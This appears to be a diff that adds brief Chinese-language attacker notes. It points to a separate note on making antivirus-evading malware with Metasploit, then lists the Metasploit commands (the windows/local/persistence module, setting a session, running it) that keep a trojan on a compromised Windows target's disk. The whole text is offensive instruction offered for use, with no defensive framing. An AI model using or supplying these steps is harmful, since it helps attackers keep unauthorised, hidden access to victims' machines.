@@ -1,0 +1,16 @@
+零 免杀：详见《msf制毒》
+
+
+
+
+
+
+
+一 持久化
+0 就是在target上找个目录放个脚本和exe，持久化意味着木马必须在硬盘上保存，因而持久化和静态免杀是一对天然的矛盾。
+
+1 use exploit/windows/local/persistence
+
+2 set SESSION <会话id>
+
+3 exploit
